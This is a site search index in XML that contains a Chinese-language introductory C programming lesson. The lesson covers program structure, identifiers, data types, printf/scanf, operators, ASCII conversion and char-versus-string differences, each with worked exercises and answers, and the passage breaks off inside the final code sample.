<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1. C语言基础与数据</title>
    <url>/2025/12/10/1.%20C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="第一章：C-语言基础与数据"><a href="#第一章：C-语言基础与数据" class="headerlink" title="第一章：C 语言基础与数据"></a>第一章：C 语言基础与数据</h1><hr>
<h2 id="1-C-语言程序的最小结构"><a href="#1-C-语言程序的最小结构" class="headerlink" title="1. C 语言程序的最小结构"></a>1. C 语言程序的最小结构</h2><p>所有的 C 语言程序都始于一个核心结构。</p>
<table>
<thead>
<tr>
<th><strong>代码行</strong></th>
<th><strong>作用</strong></th>
<th><strong>解释</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>#include &lt;stdio.h&gt;</code></td>
<td><strong>头文件包含</strong></td>
<td>引入标准输入输出库（Standard Input&#x2F;Output）。<code>printf</code> 函数就定义在这个库中。<strong>没有它，你就不能在屏幕上打印任何东西。</strong></td>
</tr>
<tr>
<td><code>int main() { ... }</code></td>
<td><strong>主函数定义</strong></td>
<td><code>main</code> 是 C 程序的<strong>入口点</strong>。操作系统就是从这里开始执行你的程序的。<code>int</code> 表示这个函数执行完毕后会返回一个整数值。</td>
</tr>
<tr>
<td><code>printf(&quot;...&quot;);</code></td>
<td><strong>核心输出语句</strong></td>
<td>调用 <code>printf</code> 函数，将括号内的字符串内容打印到屏幕上。<code>\n</code> 是一个<strong>转义字符</strong>，表示换行。</td>
</tr>
<tr>
<td><code>return 0;</code></td>
<td><strong>程序返回</strong></td>
<td>告诉操作系统程序已经<strong>成功</strong>执行完毕。在 C 语言中，<code>return 0</code> 通常表示程序正常退出。</td>
</tr>
</tbody></table>
<hr>
<h3 id="习题-1-对应：C-语言程序的最小结构"><a href="#习题-1-对应：C-语言程序的最小结构" class="headerlink" title="习题 1 (对应：C 语言程序的最小结构)"></a><strong>习题 1 (对应：C 语言程序的最小结构)</strong></h3><p><strong>题目：</strong> 请编写一个完整的 C 语言程序，在屏幕上打印输出字符串 <code>Hello, World!</code> 并换行。</p>
<p><strong>要求：</strong> 包含必要的头文件，主函数结构完整，返回值正确。</p>
<p><strong>预期输出结果</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello, World!</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong> </p>
<ol>
<li><p>主函数最后要加上<code>return 0;</code></p>
</li>
<li><p>输出语句和返回语句后面的分号<code>;</code>不能少</p>
</li>
</ol>
<hr>
<h2 id="2-标识符与命名规则"><a href="#2-标识符与命名规则" class="headerlink" title="2. 标识符与命名规则"></a>2. 标识符与命名规则</h2><p>在定义变量（如 <code>score</code>, <code>weight</code>）时，名字不能随便起。</p>
<ol>
<li><p><strong>组成</strong>：只能包含<strong>字母</strong> (A-Z, a-z)、<strong>数字</strong> (0-9)、<strong>下划线</strong> (<code>_</code>)。</p>
</li>
<li><p><strong>禁忌</strong>：<strong>不能以数字开头</strong>（如 <code>1st</code> 是错的）。</p>
</li>
<li><p><strong>避雷</strong>：不能是<strong>关键字</strong>（如 <code>int</code>, <code>return</code>, <code>if</code> 等）。</p>
</li>
</ol>
<hr>
<h3 id="习题-2-对应：标识符与命名规则"><a href="#习题-2-对应：标识符与命名规则" class="headerlink" title="习题 2 (对应：标识符与命名规则)"></a><strong>习题 2 (对应：标识符与命名规则)</strong></h3><p><strong>题目：</strong> 判断下列变量名是否合法。待判断变量名：</p>
<ol>
<li><p><code>2nd_score</code></p>
</li>
<li><p><code>total_sum</code></p>
</li>
<li><p><code>float</code></p>
</li>
<li><p><code>_user_id</code></p>
</li>
</ol>
<p><strong>要求：</strong> 将合法的变量写出来。</p>
<p><strong>答案：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 2nd_score</span><br><span class="line">   错误，不能以数字开头</span><br><span class="line">2. total_sum</span><br><span class="line">   正确</span><br><span class="line">3. float</span><br><span class="line">   错误，是关键字</span><br><span class="line">4. _user_id</span><br><span class="line">   正确 </span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<ol>
<li><p>变量名不能包含减号 <code>-</code> (如 <code>total-sum</code> 是错的)。</p>
</li>
<li><p>即使是以 <code>_</code> 开头也是合法的，但不能以数字开头。</p>
</li>
</ol>
<hr>
<h2 id="3-基本数据类型"><a href="#3-基本数据类型" class="headerlink" title="3. 基本数据类型"></a>3. 基本数据类型</h2><p>数据类型决定了变量存储的数据种类和占用的内存空间大小。</p>
<table>
<thead>
<tr>
<th><strong>类型 (Type)</strong></th>
<th><strong>存储内容</strong></th>
<th><strong>典型大小</strong></th>
<th><strong>格式控制符</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>int</code></strong></td>
<td>整数 (Integer)</td>
<td>4 字节</td>
<td><code>%d</code></td>
</tr>
<tr>
<td><strong><code>float</code></strong></td>
<td>单精度浮点数 (小数)</td>
<td>4 字节</td>
<td><code>%f</code></td>
</tr>
<tr>
<td><strong><code>double</code></strong></td>
<td>双精度浮点数 (更精确的小数)</td>
<td>8 字节</td>
<td><code>%lf</code></td>
</tr>
<tr>
<td><strong><code>char</code></strong></td>
<td>字符 (Character)</td>
<td>1 字节</td>
<td><code>%c</code></td>
</tr>
</tbody></table>
<p><strong>补充考点：</strong></p>
<ul>
<li><p><strong><code>sizeof</code> 运算符</strong>：用于计算类型大小。例如 <code>sizeof(int)</code> 等于 4。</p>
</li>
<li><p><strong>变量定义</strong>：在使用任何变量前，必须先定义它。例如：<code>int score;</code> 或 <code>float price = 10.5;</code></p>
</li>
</ul>
<hr>
<h3 id="习题-3-对应：基本数据类型"><a href="#习题-3-对应：基本数据类型" class="headerlink" title="习题 3 (对应：基本数据类型)"></a><strong>习题 3 (对应：基本数据类型)</strong></h3><p><strong>题目：</strong> 编写程序，定义以下 4 个变量并赋予初始值：</p>
<ol>
<li><p>整型 <code>age</code> &#x3D; 18</p>
</li>
<li><p>单精度浮点 <code>height</code> &#x3D; 175.5</p>
</li>
<li><p>双精度浮点 <code>pi</code> &#x3D; 3.1415926</p>
</li>
<li><p>字符型 <code>level</code> &#x3D; ‘A’然后将它们依次打印出来（中间用空格隔开）。</p>
</li>
</ol>
<p><strong>要求：</strong> 必须使用正确的数据类型关键字和对应的格式控制符。</p>
<p><strong>预期输出结果：</strong></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">18 175.500000 3.141593 A</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> age = <span class="number">18</span>;</span><br><span class="line">    <span class="type">float</span> height = <span class="number">175.5</span>;</span><br><span class="line">    <span class="type">double</span> pi = <span class="number">3.1415926</span>;</span><br><span class="line">    <span class="type">char</span> level = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// %.6lf 是默认精度，题目未要求精度控制，默认即可</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %f %lf %c\n&quot;</span>, age, height, pi, level);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<ol>
<li><p>字符常量必须用单引号 <code>&#39; &#39;</code>，不能用双引号。</p>
</li>
<li><p>定义变量时忘记初始化（虽不报错，但打印出来是乱码）。</p>
</li>
</ol>
<hr>
<h2 id="4-核心-I-O-函数-输入-输出"><a href="#4-核心-I-O-函数-输入-输出" class="headerlink" title="4. 核心 I&#x2F;O 函数 (输入&#x2F;输出)"></a>4. 核心 I&#x2F;O 函数 (输入&#x2F;输出)</h2><table>
<thead>
<tr>
<th><strong>函数</strong></th>
<th><strong>作用</strong></th>
<th><strong>格式控制符</strong></th>
<th><strong>示例</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>printf()</code></strong></td>
<td><strong>输出</strong>数据到屏幕。</td>
<td><code>%d</code> (整数), <code>%f</code> (浮点数), <code>%c</code> (字符), <code>%s</code> (字符串)</td>
<td><code>printf(&quot;Age: %d&quot;, age);</code></td>
</tr>
<tr>
<td><strong><code>scanf()</code></strong></td>
<td><strong>接收</strong>用户从键盘的输入。</td>
<td><code>%d</code>, <code>%f</code>, <code>%c</code>, <code>%s</code></td>
<td><code>scanf(&quot;%d&quot;, &amp;age);</code></td>
</tr>
</tbody></table>
<p><strong>重点提醒 ：</strong> 使用 <code>scanf</code> 读取变量时，除了字符串之外，<strong>变量名前面必须加 <code>&amp;</code> 符号</strong>（取地址符）。这是 C 语言中传址调用的基础。，</p>
<p><strong>补充细节：</strong></p>
<ul>
<li><p><strong><code>double</code> 的读写</strong>：</p>
<ul>
<li><p><code>printf</code> 输出时可以用 <code>%f</code> 或 <code>%lf</code>。</p>
</li>
<li><p><code>scanf</code> <strong>输入时必须用 <code>%lf</code></strong>，否则数据会出错。</p>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="题-4-对应：核心-I-O-函数"><a href="#题-4-对应：核心-I-O-函数" class="headerlink" title="题 4 (对应：核心 I&#x2F;O 函数)"></a><strong>题 4 (对应：核心 I&#x2F;O 函数)</strong></h3><p><strong>题目：</strong> 编写一个程序，要求用户输入他的<strong>学号 (整数)</strong> 和 <strong>体重 (浮点数)</strong>，然后程序将这两项信息打印出来。</p>
<p><strong>要求：</strong></p>
<ol>
<li><p>学号使用 <code>int</code> 类型，体重使用 <code>double</code> 类型。</p>
</li>
<li><p>使用 <code>scanf</code> 获取输入，使用 <code>printf</code> 打印输出。</p>
</li>
<li><p>输出体重时，要求<strong>保留两位小数</strong>。</p>
</li>
</ol>
<p><strong>预期输出结果：</strong></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">请输入你的学号: </span><br><span class="line">20251101</span><br><span class="line">请输入你的体重 (kg): </span><br><span class="line">72.5</span><br><span class="line">---你的信息是---</span><br><span class="line">学号: 20251101</span><br><span class="line">体重: 72.50 kg</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">double</span> weight;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你的学号: \n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你的体重 (kg): \n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;weight); <span class="comment">// 重点：double 输入必须用 %lf</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---你的信息是---\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;学号: %d\n&quot;</span>, id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;体重: %.2lf kg\n&quot;</span>, weight); <span class="comment">// 重点：保留两位小数用 %.2lf</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<ol>
<li><p><code>scanf</code> 中变量名前忘记加 <code>&amp;</code>。</p>
</li>
<li><p><code>scanf</code> 读取 <code>double</code> 时错误使用了 <code>%f</code>（会导致数据全部读错）。</p>
</li>
</ol>
<hr>
<h2 id="5-运算符"><a href="#5-运算符" class="headerlink" title="5. 运算符"></a>5. 运算符</h2><h3 id="5-1-算术运算符"><a href="#5-1-算术运算符" class="headerlink" title="5.1 算术运算符"></a>5.1 算术运算符</h3><p>用于数学计算。</p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>描述</strong></th>
<th><strong>示例</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>+</code></td>
<td>加</td>
<td><code>a + b</code></td>
</tr>
<tr>
<td><code>-</code></td>
<td>减</td>
<td><code>a - b</code></td>
</tr>
<tr>
<td><code>*</code></td>
<td>乘</td>
<td><code>a * b</code></td>
</tr>
<tr>
<td><code>/</code></td>
<td><strong>除</strong></td>
<td><code>a / b</code></td>
</tr>
<tr>
<td><code>%</code></td>
<td><strong>取余</strong> (模运算)</td>
<td><code>a % b</code> (只能用于整数)</td>
</tr>
</tbody></table>
<p>重点陷阱：</p>
<p>C 语言中的整数除法 (int &#x2F; int) 结果仍然是整数，会舍弃小数部分。</p>
<ul>
<li><p>例如：<code>int result = 10 / 3;</code> $\Rightarrow$ <code>result</code> 是 $3$ 而不是 $3.333$。</p>
</li>
<li><p>若想得到浮点结果，至少一个操作数必须是浮点类型：<code>10.0 / 3</code> 或 <code>(float)10 / 3</code>。</p>
</li>
</ul>
<h3 id="5-2-关系运算符"><a href="#5-2-关系运算符" class="headerlink" title="5.2 关系运算符"></a>5.2 关系运算符</h3><p>用于比较两个值，结果是 <strong>真 (1)</strong> 或 <strong>假 (0)</strong>。</p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>&gt;</code></td>
<td>大于</td>
</tr>
<tr>
<td><code>&lt;</code></td>
<td>小于</td>
</tr>
<tr>
<td><code>&gt;=</code></td>
<td>大于等于</td>
</tr>
<tr>
<td><code>&lt;=</code></td>
<td>小于等于</td>
</tr>
<tr>
<td><code>==</code></td>
<td><strong>等于</strong> (注意是两个等号！)</td>
</tr>
<tr>
<td><code>!=</code></td>
<td>不等于</td>
</tr>
</tbody></table>
<h3 id="5-3-逻辑运算符"><a href="#5-3-逻辑运算符" class="headerlink" title="5.3 逻辑运算符"></a>5.3 逻辑运算符</h3><p>用于组合多个关系表达式。</p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>&amp;&amp;</code></td>
<td><strong>逻辑与 (AND)</strong>：两边都为真才为真。</td>
</tr>
<tr>
<td>&#96;|</td>
<td>&#96;</td>
</tr>
<tr>
<td><code>!</code></td>
<td><strong>逻辑非 (NOT)</strong>：取反。</td>
</tr>
</tbody></table>
<p><strong>补充考点 (逻辑短路)：</strong></p>
<ul>
<li><p>对于 <code>&amp;&amp;</code>：如果左边是假 (0)，右边<strong>不会执行</strong>。</p>
</li>
<li><p>对于 <code>||</code>：如果左边是真 (非0)，右边<strong>不会执行</strong>。</p>
</li>
</ul>
<hr>
<h3 id="习题-5-1-对应：算术运算符"><a href="#习题-5-1-对应：算术运算符" class="headerlink" title="习题 5.1 (对应：算术运算符)"></a><strong>习题 5.1 (对应：算术运算符)</strong></h3><p><strong>题目：</strong> 计算 10 和 3 的<strong>和、差、积</strong>，以及 10 除以 3 的<strong>整数商</strong>和<strong>浮点数商</strong>。</p>
<p><strong>要求：</strong></p>
<ol>
<li><p>必须使用 <code>int</code>, <code>float</code> 或 <code>double</code> 至少三种数据类型。</p>
</li>
<li><p>重点展示<strong>整数除法</strong>和<strong>浮点数除法</strong>的区别。</p>
</li>
</ol>
<p><strong>预期输出结果：</strong></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">10 + 3 = 13</span><br><span class="line">10 - 3 = 7</span><br><span class="line">10 * 3 = 30</span><br><span class="line">10 / 3 的整数商是：3</span><br><span class="line">10 / 3 的浮点数商是：3.333333</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sum = a + b;</span><br><span class="line">    <span class="type">int</span> diff = a - b;</span><br><span class="line">    <span class="type">int</span> product = a * b;</span><br><span class="line">    <span class="type">int</span> int_div = a / b;         <span class="comment">// 整数除法</span></span><br><span class="line">    <span class="type">double</span> float_div = (<span class="type">double</span>)a / b; <span class="comment">// 浮点除法（强制转换）</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10 + 3 = %d\n&quot;</span>, sum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10 - 3 = %d\n&quot;</span>, diff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10 * 3 = %d\n&quot;</span>, product);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10 / 3 的整数商是：%d\n&quot;</span>, int_div);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10 / 3 的浮点数商是：%lf\n&quot;</span>, float_div);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<ol>
<li><p>整数除以整数 (<code>10/3</code>) 结果会直接截断小数部分变成 <code>3</code>。</p>
</li>
<li><p>想要得到小数，必须让除号两边至少有一个是浮点数。</p>
</li>
</ol>
<hr>
<h3 id="习题-5-2-对应：关系运算符"><a href="#习题-5-2-对应：关系运算符" class="headerlink" title="习题 5.2 (对应：关系运算符)"></a><strong>习题 5.2 (对应：关系运算符)</strong></h3><p><strong>题目：</strong> 定义两个整数 <code>a = 5</code> 和 <code>b = 3</code>。请分别打印 <code>a &gt; b</code>, <code>a &lt; b</code>, <code>a == b</code> 的运算结果。</p>
<p><strong>要求：</strong> 理解关系运算的结果本质上是整数 1 (真) 或 0 (假)。</p>
<p><strong>预期输出结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 &gt; 3 的结果是: 1</span><br><span class="line">5 &lt; 3 的结果是: 0</span><br><span class="line">5 == 3 的结果是: 0</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>, b = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5 &gt; 3 的结果是: %d\n&quot;</span>, a &gt; b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5 &lt; 3 的结果是: %d\n&quot;</span>, a &lt; b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5 == 3 的结果是: %d\n&quot;</span>, a == b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<ol>
<li><p>判断相等必须用双等号 <code>==</code>，单等号 <code>=</code> 是赋值。</p>
</li>
<li><p>关系表达式的结果只有 0 和 1，不会输出 “True” 或 “False”。</p>
</li>
</ol>
<hr>
<h3 id="习题-5-3-对应：逻辑运算符"><a href="#习题-5-3-对应：逻辑运算符" class="headerlink" title="习题 5.3 (对应：逻辑运算符)"></a><strong>习题 5.3 (对应：逻辑运算符)</strong></h3><p><strong>题目：</strong> 验证逻辑运算的“短路”现象。定义 <code>int a = 0</code> 和 <code>int b = 10</code>。执行表达式 <code>(a != 0) &amp;&amp; (b++ &gt; 10)</code> 后，打印 <code>b</code> 的值。</p>
<p><strong>要求：</strong> 解释为什么 <code>b</code> 的值没有发生变化。</p>
<p><strong>预期输出结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行后 b 的值: 10</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 逻辑与短路：因为 (a != 0) 为假，电脑直接判定结果为假</span></span><br><span class="line">    <span class="comment">// 后面的 (b++ &gt; 10) 根本不会被执行</span></span><br><span class="line">    <span class="keyword">if</span> ((a != <span class="number">0</span>) &amp;&amp; (b++ &gt; <span class="number">10</span>)) &#123;</span><br><span class="line">        <span class="comment">// 这里不会执行</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;执行后 b 的值: %d\n&quot;</span>, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<ol>
<li><p>误以为表达式里的代码一定会执行。</p>
</li>
<li><p><code>&amp;&amp;</code> 运算中，一旦左边为假 (0)，右边立即停止执行。</p>
</li>
</ol>
<hr>
<h2 id="6-ASCII-码与类型转换"><a href="#6-ASCII-码与类型转换" class="headerlink" title="6. ASCII 码与类型转换"></a>6. ASCII 码与类型转换</h2><ol>
<li><p><strong>关键 ASCII 码值</strong>：</p>
<ul>
<li><p><code>&#39;A&#39;</code> &#x3D; 65</p>
</li>
<li><p><code>&#39;a&#39;</code> &#x3D; 97 (小写 &#x3D; 大写 + 32)</p>
</li>
<li><p><code>&#39;0&#39;</code> &#x3D; 48</p>
</li>
</ul>
</li>
<li><p><strong>自动类型转换</strong>：</p>
<ul>
<li>当 <code>int</code> 和 <code>double</code> 运算时，结果会自动变成 <code>double</code>。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="习题-6-对应：ASCII-码与字符计算"><a href="#习题-6-对应：ASCII-码与字符计算" class="headerlink" title="习题 6 (对应：ASCII 码与字符计算)"></a><strong>习题 6 (对应：ASCII 码与字符计算)</strong></h3><p><strong>题目：</strong> 编写程序，输入一个小写字母（如 ‘a’），将其转换为大写字母并输出。同时输出转换后的字符对应的 ASCII 码整数值。</p>
<p><strong>要求：</strong> 利用 <code>&#39;a&#39;</code> 和 <code>&#39;A&#39;</code> 之间的差值 (32) 进行计算。</p>
<p><strong>预期输出结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入小写字母: a</span><br><span class="line">转换后的大写字母: A</span><br><span class="line">对应的 ASCII 码: 65</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> small;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入小写字母: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;small);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 小写转大写：减去 32</span></span><br><span class="line">    <span class="type">char</span> big = small - <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的大写字母: %c\n&quot;</span>, big);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;对应的 ASCII 码: %d\n&quot;</span>, big);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<ol>
<li>混淆大小写转换的加减方向（小转大是减，大转小是加）。</li>
<li>忘记 <code>&#39;A&#39;</code> 的 ASCII 码是 65，<code>&#39;a&#39;</code> 是 97。</li>
</ol>
<hr>
<h2 id="7-字符与字符串的区别-单引号-vs-双引号-必考"><a href="#7-字符与字符串的区别-单引号-vs-双引号-必考" class="headerlink" title="7. 字符与字符串的区别 (单引号 vs 双引号) [必考]"></a>7. 字符与字符串的区别 (单引号 vs 双引号) <strong>[必考]</strong></h2><p>C 语言中，单引号和双引号绝对不能混用，它们的本质完全不同。</p>
<h3 id="7-1-核心对比表"><a href="#7-1-核心对比表" class="headerlink" title="7.1 核心对比表"></a>7.1 核心对比表</h3><table>
<thead>
<tr>
<th><strong>特性</strong></th>
<th><strong>单引号 ‘ ‘</strong></th>
<th><strong>双引号 “ “</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>对象</strong></td>
<td><strong>字符常量</strong> (Character)</td>
<td><strong>字符串字面量</strong> (String)</td>
</tr>
<tr>
<td><strong>本质</strong></td>
<td><strong>是一个整数</strong> (ASCII 码值)</td>
<td><strong>是一个地址</strong> (指向内存中的数组)</td>
</tr>
<tr>
<td><strong>大小 (以 ‘A’ 为例)</strong></td>
<td>占 <strong>1</strong> 个字节 (存的是 65)</td>
<td>占 <strong>2</strong> 个字节 (存的是 ‘A’ 和 ‘\0’)</td>
</tr>
<tr>
<td><strong>示例</strong></td>
<td><code>char c = &#39;A&#39;;</code></td>
<td><code>char str[] = &quot;A&quot;;</code></td>
</tr>
<tr>
<td><strong>能做加减法吗？</strong></td>
<td><strong>能</strong> (<code>&#39;A&#39; + 1</code> 等于 66)</td>
<td><strong>不能</strong> (<code>&quot;A&quot; + 1</code> 是非法指针运算)</td>
</tr>
</tbody></table>
<h3 id="7-2-经典陷阱：’A’-和-“A”-的区别"><a href="#7-2-经典陷阱：’A’-和-“A”-的区别" class="headerlink" title="7.2 经典陷阱：’A’ 和 “A” 的区别"></a>7.2 经典陷阱：’A’ 和 “A” 的区别</h3><p>这是选择题最爱考的题目：</p>
<ul>
<li><p><strong><code>&#39;A&#39;</code></strong>：</p>
<ul>
<li><p>它是单个字符。</p>
</li>
<li><p>在内存里就是数字 <strong>65</strong>。</p>
</li>
</ul>
</li>
<li><p><strong><code>&quot;A&quot;</code></strong>：</p>
<ul>
<li><p>它是字符串。</p>
</li>
<li><p>虽然看起来只有一个字母，但 C 语言会自动在后面加一个结束符 <code>\0</code>。</p>
</li>
<li><p>所以在内存里它是：<code>&#39;A&#39;</code> + <code>\0&#39;</code>。</p>
</li>
</ul>
</li>
</ul>
<p><strong>错误写法：</strong></p>
<p>char c &#x3D; “A”; &#x2F;&#x2F; 错！不能把一个“字符串地址”硬塞给一个“字符变量”。</p>
<p>char str[] &#x3D; ‘A’; &#x2F;&#x2F; 错！不能用单个字符去初始化数组（除非用花括号）。</p>
<hr>
<h3 id="习题-7-对应：单引号与双引号的区别"><a href="#习题-7-对应：单引号与双引号的区别" class="headerlink" title="习题 7 (对应：单引号与双引号的区别)"></a>习题 7 (对应：单引号与双引号的区别)</h3><p>题目： 编写程序，定义字符变量 c &#x3D; ‘A’ 和字符串数组 str &#x3D; “A”。</p>
<p>请通过 sizeof 运算符，分别打印它们在内存中占用的字节数，以验证 “A” 确实比 ‘A’ 多一个 \0。</p>
<p><strong>要求：</strong></p>
<ol>
<li><p>使用 <code>sizeof</code> 运算符。</p>
</li>
<li><p>理解为什么字符串的大小是 2。</p>
</li>
</ol>
<p><strong>预期输出结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符 &#x27;A&#x27; 的大小: 1</span><br><span class="line">字符串 &quot;A&quot; 的大小: 2</span><br></pre></td></tr></table></figure>

<p><em>(注：在某些编译器下，sizeof(‘A’) 可能会显示 4，因为 C 语言将字符常量视为 int，但这里我们要验证的是它作为 char 存储时的概念，或者可以直接对比 sizeof(char变量) 和 sizeof(“A”)。为了不让你混淆，我们对比变量和字符串字面量)</em></p>
<p><strong>修正后的严谨答案：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;A&#x27;</span>;        <span class="comment">// 单引号：单个字符</span></span><br><span class="line">    <span class="comment">// char str[] = &quot;A&quot;; // 双引号：字符串 (包含 &#x27;A&#x27; 和 &#x27;\0&#x27;)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sizeof(c) 计算变量 c 占用的空间 -&gt; 1 字节</span></span><br><span class="line">    <span class="comment">// sizeof(&quot;A&quot;) 计算字符串 &quot;A&quot; 占用的空间 -&gt; 2 字节 (&#x27;A&#x27; + 